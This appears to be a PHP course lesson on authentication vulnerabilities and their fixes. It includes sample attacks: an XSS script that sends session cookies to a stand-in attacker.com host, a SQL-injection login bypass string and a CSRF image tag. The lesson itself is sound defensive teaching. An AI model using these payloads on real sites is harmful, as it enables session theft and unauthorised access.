# Lesson 11 - Authentication Security: Common Vulnerabilities & Prevention

**Duration**: 2 hours
**Objectives**: Understand and prevent all major authentication security vulnerabilities

---

## Introduction: Why Authentication Security Matters

Authentication is your first line of defense. If attackers can bypass it, they can:
- Steal user accounts
- Access sensitive data
- Impersonate users
- Modify or delete data
- Launch attacks on other users

**This lesson covers every major vulnerability you need to know.**

---

## 1. Session Fixation

### What is Session Fixation?

Attacker forces a user to use a specific session ID, then hijacks that session after login.

### The Attack

```
1. Attacker gets a valid session ID from your site
   Session ID: abc123

2. Attacker tricks victim into using this session ID
   Sends link: yoursite.com/login.php?PHPSESSID=abc123

3. Victim logs in (using the attacker's session ID)
   Server associates abc123 with victim's account

4. Attacker now uses abc123 to access victim's account!
```

### The Vulnerability

```php
<?php
// VULNERABLE CODE
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ... validate credentials ...

    $_SESSION['user_id'] = $userId;
    // Session ID never changes! Vulnerability!
}
?>
```

### The Fix: Regenerate Session ID

```php
<?php
// SECURE CODE
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ... validate credentials ...

    // Regenerate session ID after login (critical!)
    session_regenerate_id(true); // true = delete old session

    $_SESSION['user_id'] = $userId;
}
?>
```

**Always regenerate session ID on:**
- Login
- Logout
- Privilege change (e.g., becoming admin)

---

## 2. Session Hijacking

### What is Session Hijacking?

Attacker steals a valid session ID and uses it to impersonate the victim.

### Attack Vectors

1. **XSS (Cross-Site Scripting)**
   ```javascript
   // Attacker injects this script
   <script>
   document.location='http://attacker.com/steal.php?cookie='+document.cookie;
   </script>
   ```

2. **Network Sniffing**
   - Intercept HTTP traffic (if not using HTTPS)
   - Read session cookie from network packets

3. **Man-in-the-Middle**
   - Position between user and server
   - Intercept and steal cookies

### Prevention

#### A. HttpOnly Cookie Flag

```php
<?php
// Prevent JavaScript access to session cookie
ini_set('session.cookie_httponly', 1);
session_start();
?>
```

Now this attack fails:
```javascript
document.cookie // Returns everything EXCEPT session cookie
```

#### B. Secure Cookie Flag (HTTPS Only)

```php
<?php
// Only send cookie over HTTPS
ini_set('session.cookie_secure', 1);
session_start();
?>
```

Cookie won't be sent over unencrypted HTTP.

#### C. SameSite Cookie Attribute

```php
<?php
// Prevent CSRF attacks
ini_set('session.cookie_samesite', 'Strict');
session_start();
?>
```

Cookie won't be sent with cross-site requests.

#### D. Session Fingerprinting

```php
<?php
// includes/session.php

function initSessionFingerprint(): void
{
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? '';
}

function validateSessionFingerprint(): bool
{
    $currentUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $storedUA = $_SESSION['user_agent'] ?? '';

    // User agent changed = possible hijacking
    if ($storedUA !== '' && $currentUA !== $storedUA) {
        return false;
    }

    // Optional: Check IP (can break with mobile networks)
    // $currentIP = $_SERVER['REMOTE_ADDR'] ?? '';
    // $storedIP = $_SESSION['ip_address'] ?? '';
    // if ($storedIP !== '' && $currentIP !== $storedIP) {
    //     return false;
    // }

    return true;
}
?>
```

#### E. Complete Session Security Configuration

```php
<?php
// config/session-security.php

// Session name (hide that it's PHP)
ini_set('session.name', 'APPSESSIONID');

// Cookie flags
ini_set('session.cookie_httponly', 1);     // No JavaScript access
ini_set('session.cookie_secure', 1);       // HTTPS only
ini_set('session.cookie_samesite', 'Strict'); // CSRF protection

// Strict mode (reject uninitialized session IDs)
ini_set('session.use_strict_mode', 1);

// Don't accept session ID from URL
ini_set('session.use_only_cookies', 1);
ini_set('session.use_trans_sid', 0);

// Strong session ID
ini_set('session.sid_length', 48);
ini_set('session.sid_bits_per_character', 6);

// Session timeout
ini_set('session.gc_maxlifetime', 1800); // 30 minutes

session_start();
?>
```

---

## 3. Brute Force Attacks

### What is Brute Force?

Attacker tries thousands of password combinations until one works.

```
Login attempt: admin / password123 → Failed
Login attempt: admin / password456 → Failed
Login attempt: admin / admin123 → Failed
...
Login attempt: admin / secret789 → Success!
```

### Prevention

#### A. Account Lockout

```php
<?php
// includes/brute-force-protection.php

function incrementFailedAttempts(PDO $pdo, int $userId): void
{
    $stmt = $pdo->prepare("
        UPDATE users
        SET failed_login_attempts = failed_login_attempts + 1
        WHERE id = ?
    ");
    $stmt->execute([$userId]);

    // Check if should lock
    $stmt = $pdo->prepare("SELECT failed_login_attempts FROM users WHERE id = ?");
    $stmt->execute([$userId]);
    $attempts = $stmt->fetchColumn();

    if ($attempts >= 5) {
        lockAccount($pdo, $userId, 30); // Lock for 30 minutes
    }
}

function lockAccount(PDO $pdo, int $userId, int $minutes): void
{
    $lockUntil = date('Y-m-d H:i:s', time() + ($minutes * 60));

    $stmt = $pdo->prepare("
        UPDATE users
        SET account_locked_until = ?
        WHERE id = ?
    ");
    $stmt->execute([$lockUntil, $userId]);
}

function resetFailedAttempts(PDO $pdo, int $userId): void
{
    $stmt = $pdo->prepare("
        UPDATE users
        SET failed_login_attempts = 0,
            account_locked_until = NULL
        WHERE id = ?
    ");
    $stmt->execute([$userId]);
}
?>
```

#### B. IP-Based Rate Limiting

```php
<?php
// includes/rate-limiter.php

function checkLoginRateLimit(PDO $pdo, string $ip): bool
{
    // Max 10 login attempts per IP per 15 minutes
    $stmt = $pdo->prepare("
        SELECT COUNT(*) FROM login_attempts
        WHERE ip_address = ?
        AND attempted_at > DATE_SUB(NOW(), INTERVAL 15 MINUTE)
    ");
    $stmt->execute([$ip]);

    $attempts = $stmt->fetchColumn();

    return $attempts < 10;
}

function logLoginAttempt(PDO $pdo, string $ip, string $username, bool $success): void
{
    $stmt = $pdo->prepare("
        INSERT INTO login_attempts (ip_address, username, success, attempted_at)
        VALUES (?, ?, ?, NOW())
    ");
    $stmt->execute([$ip, $username, $success ? 1 : 0]);
}
?>
```

#### C. Progressive Delays

```php
<?php
function calculateLoginDelay(int $failedAttempts): int
{
    // Exponential backoff
    // Attempt 1: 0 seconds
    // Attempt 2: 2 seconds
    // Attempt 3: 4 seconds
    // Attempt 4: 8 seconds
    // Attempt 5+: 16 seconds

    if ($failedAttempts <= 1) {
        return 0;
    }

    return min(pow(2, $failedAttempts - 1), 16);
}

// In login handler
$delay = calculateLoginDelay($failedAttempts);
if ($delay > 0) {
    sleep($delay);
}
?>
```

#### D. CAPTCHA After Failed Attempts

```php
<?php
// After 3 failed attempts, require CAPTCHA
if ($failedAttempts >= 3) {
    if (!isset($_POST['captcha']) || !verifyCaptcha($_POST['captcha'])) {
        $errors[] = 'Please complete the CAPTCHA';
    }
}
?>
```

---

## 4. Password Security

### Weak Password Vulnerabilities

```php
// BAD - Weak password requirements
if (strlen($password) >= 6) {
    // "123456" passes! Terrible!
}

// GOOD - Strong password requirements
function validatePasswordStrength(string $password): array
{
    $errors = [];

    if (strlen($password) < 12) { // Increased from 8
        $errors[] = 'Password must be at least 12 characters';
    }

    if (!preg_match('/[A-Z]/', $password)) {
        $errors[] = 'Password must contain uppercase letter';
    }

    if (!preg_match('/[a-z]/', $password)) {
        $errors[] = 'Password must contain lowercase letter';
    }

    if (!preg_match('/[0-9]/', $password)) {
        $errors[] = 'Password must contain number';
    }

    if (!preg_match('/[^A-Za-z0-9]/', $password)) {
        $errors[] = 'Password must contain special character';
    }

    // Check against common passwords
    if (isCommonPassword($password)) {
        $errors[] = 'This password is too common';
    }

    return $errors;
}

function isCommonPassword(string $password): bool
{
    $commonPasswords = [
        'password', 'password123', '123456', '12345678',
        'qwerty', 'abc123', 'monkey', '1234567', 'letmein',
        'trustno1', 'dragon', 'baseball', 'iloveyou', 'master',
        'sunshine', 'ashley', 'bailey', 'shadow', 'superman'
    ];

    return in_array(strtolower($password), $commonPasswords);
}
?>
```

### Password Storage

```php
// NEVER DO THIS!
$password = $_POST['password'];
$sql = "INSERT INTO users (password) VALUES ('$password')"; // Plain text!

// NEVER DO THIS EITHER!
$hash = md5($password); // MD5 is broken!
$hash = sha1($password); // SHA1 is broken!

// ALWAYS DO THIS!
$hash = password_hash($password, PASSWORD_DEFAULT);
// Uses bcrypt by default, includes salt, adjustable cost
```

---

## 5. SQL Injection in Authentication

### The Vulnerability

```php
<?php
// VULNERABLE CODE - NEVER DO THIS!
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $pdo->query($sql);
?>
```

### The Attack

```
Username: admin' OR '1'='1
Password: anything

Generated SQL:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'

This always returns true! Attacker is logged in!
```

### The Fix: Prepared Statements

```php
<?php
// SECURE CODE - Always use prepared statements
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['password'])) {
    // Login successful
}
?>
```

**Never concatenate user input into SQL queries!**

---

## 6. Timing Attacks

### What is a Timing Attack?

Attacker measures response time to gain information.

```php
// VULNERABLE CODE
if ($username === 'admin') {
    // Check password (takes time)
    if ($password === $storedPassword) {
        // Login
    }
}
// If username wrong, returns immediately (fast)
// If username right but password wrong, takes longer
// Attacker can detect this timing difference!
```

### Prevention

```php
<?php
// Always check both, regardless of username validity
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch();

// Use timing-safe comparison
if ($user && password_verify($password, $user['password'])) {
    // password_verify() is timing-safe
    // Login successful
}

// For custom comparisons, use hash_equals()
if (hash_equals($storedToken, $providedToken)) {
    // Timing-safe comparison
}
?>
```

**Never use `===` or `==` for security-sensitive comparisons!**

---

## 7. Information Disclosure

### The Problem: Revealing Too Much

```php
// BAD - Reveals which part failed
if (!$user) {
    echo "Username doesn't exist";
} elseif (!password_verify($password, $user['password'])) {
    echo "Password is incorrect";
}
// Attacker now knows which usernames exist!

// GOOD - Generic message
if (!$user || !password_verify($password, $user['password'])) {
    echo "Invalid credentials";
}
// Attacker learns nothing
```

### Password Reset Vulnerability

```php
// BAD - Reveals if email exists
if (!$user) {
    echo "Email not found";
} else {
    echo "Reset link sent";
}

// GOOD - Same message regardless
echo "If that email exists, a reset link has been sent";
```

### Registration Vulnerability

```php
// BAD - Reveals which usernames are taken (email enumeration)
if (usernameExists($username)) {
    echo "Username taken";
}

// BETTER - Still reveals info, but necessary for UX
if (usernameExists($username)) {
    echo "Username taken, please choose another";
}
// This is acceptable trade-off for usability
```

---

## 8. Cross-Site Request Forgery (CSRF)

### What is CSRF?

Attacker tricks victim into performing actions without their knowledge.

### The Attack

```html
<!-- Attacker's malicious website -->
<img src="https://yoursite.com/transfer.php?to=attacker&amount=1000">

<!-- If victim is logged in, this executes the transfer! -->
```

### Prevention: CSRF Tokens

```php
<?php
// includes/csrf.php

function generateCSRFToken(): string
{
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verifyCSRFToken(string $token): bool
{
    if (!isset($_SESSION['csrf_token'])) {
        return false;
    }

    return hash_equals($_SESSION['csrf_token'], $token);
}
?>
```

```php
<!-- In your forms -->
<form method="POST" action="transfer.php">
    <input type="hidden" name="csrf_token" value="<?= generateCSRFToken() ?>">
    <!-- Other fields -->
</form>
```

```php
<?php
// In form handler
if (!verifyCSRFToken($_POST['csrf_token'] ?? '')) {
    die('CSRF token validation failed');
}

// Process form...
?>
```

---

## 9. Insecure Password Reset

### Vulnerabilities

#### A. Predictable Tokens

```php
// BAD - Predictable!
$token = md5($email); // Same token every time!
$token = $userId; // Can guess user IDs!

// GOOD - Random!
$token = bin2hex(random_bytes(32));
```

#### B. No Expiration

```php
// BAD - Token works forever
INSERT INTO password_resets (email, token) VALUES (?, ?)

// GOOD - Token expires
INSERT INTO password_resets (email, token, expires_at)
VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))
```

#### C. No One-Time Use

```php
// GOOD - Delete token after use
DELETE FROM password_resets WHERE token = ?
```

---

## 10. Insecure "Remember Me"

### Vulnerabilities

#### A. Storing User ID in Cookie

```php
// BAD - User ID in cookie (predictable, modifiable)
setcookie('remember_me', $userId);

// GOOD - Random token
$token = bin2hex(random_bytes(32));
setcookie('remember_me', $token);
// Store hash in database
```

#### B. Not Hashing Tokens

```php
// BAD - Store token in plain text
INSERT INTO tokens (user_id, token) VALUES (?, ?)

// GOOD - Store hash
$hash = hash('sha256', $token);
INSERT INTO tokens (user_id, token_hash) VALUES (?, ?)
```

#### C. No Expiration

```php
// GOOD - Always expire tokens
INSERT INTO tokens (user_id, token_hash, expires_at)
VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 30 DAY))
```

---

## Complete Security Checklist

### Passwords
- [ ] Minimum 12 characters
- [ ] Require mixed case, numbers, symbols
- [ ] Check against common passwords
- [ ] Use `password_hash()` with `PASSWORD_DEFAULT`
- [ ] Never store plain text passwords
- [ ] Never use MD5 or SHA1

### Sessions
- [ ] Regenerate session ID on login
- [ ] Set `session.cookie_httponly = 1`
- [ ] Set `session.cookie_secure = 1` (production)
- [ ] Set `session.cookie_samesite = Strict`
- [ ] Implement session timeout (30 minutes)
- [ ] Use session fingerprinting
- [ ] Clear session completely on logout

### SQL
- [ ] Always use prepared statements
- [ ] Never concatenate user input into SQL
- [ ] Use PDO with `ERRMODE_EXCEPTION`
- [ ] Use `EMULATE_PREPARES => false`

### Rate Limiting
- [ ] Account lockout after 5 failed attempts
- [ ] IP-based rate limiting (10 attempts per 15 min)
- [ ] Progressive delays after failures
- [ ] CAPTCHA after 3 failures

### Tokens
- [ ] Use `random_bytes()` for token generation
- [ ] Hash tokens before storing in database
- [ ] Set expiration (1 hour for reset, 30 days for remember-me)
- [ ] Delete tokens after use (one-time use)
- [ ] Allow users to revoke tokens

### CSRF
- [ ] Generate random CSRF tokens
- [ ] Include token in all forms
- [ ] Verify token on submission
- [ ] Use SameSite cookie attribute

### Information Disclosure
- [ ] Generic error messages ("Invalid credentials")
- [ ] Same message for existing/non-existing users
- [ ] Don't reveal which field was wrong
- [ ] Log security events server-side only

### HTTPS
- [ ] Use HTTPS in production (always!)
- [ ] Redirect HTTP to HTTPS
- [ ] Set Secure flag on cookies
- [ ] Use HSTS headers

### Logging & Monitoring
- [ ] Log all authentication events
- [ ] Log failed login attempts
- [ ] Log password changes
- [ ] Log suspicious activity
- [ ] Monitor for unusual patterns
- [ ] Alert on multiple failed attempts

---

## Security Testing

Test your authentication system:

```php
<?php
// tests/security-test.php

// Test 1: SQL Injection
$maliciousInput = "admin' OR '1'='1";
// Should fail gracefully

// Test 2: XSS in username
$xssInput = "<script>alert('XSS')</script>";
// Should be escaped

// Test 3: Brute force
for ($i = 0; $i < 10; $i++) {
    // Attempt login with wrong password
    // Should eventually lock account
}

// Test 4: Session fixation
// Verify session ID changes after login

// Test 5: CSRF
// Submit form without CSRF token
// Should be rejected

// Test 6: Timing attack
// Measure response time for valid vs invalid username
// Should be similar

// Test 7: Information disclosure
// Try non-existent username
// Try wrong password
// Messages should be identical
?>
```

---

## Production Configuration

```php
<?php
// config/production.php

// PHP Settings
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php-errors.log');

// Session Security
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
ini_set('session.use_only_cookies', 1);
ini_set('session.name', 'SESSID'); // Don't reveal it's PHP

// Security Headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer-when-downgrade');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');

// Content Security Policy
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");
?>
```

---

## What's Next?

You've completed Module 07! You now understand:
- Complete authentication system implementation
- All major security vulnerabilities
- How to prevent each vulnerability
- Production-ready security configuration

**Next Module: 08 - Security & Validation**
- Deep dive into XSS prevention
- CSRF protection
- Input validation and sanitization
- File upload security
- And more!

Then you'll move on to Laravel (Module 16), where you'll appreciate how Laravel handles all of this automatically!

---

## Final Thoughts

**Security is not optional.** Every vulnerability in this lesson has been exploited in real attacks. Companies have lost millions of dollars and users have lost their data because developers didn't implement proper authentication security.

**You now know better.** Use this knowledge in every project you build.

**Keep learning.** Security is always evolving. Stay updated on new vulnerabilities and best practices.

---

## Resources for Further Learning

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **PHP Security Guide**: https://phptherightway.com/#security
- **Password Hashing**: https://www.php.net/manual/en/book.password.php

**Congratulations on completing Module 07 - Sessions & Authentication!**
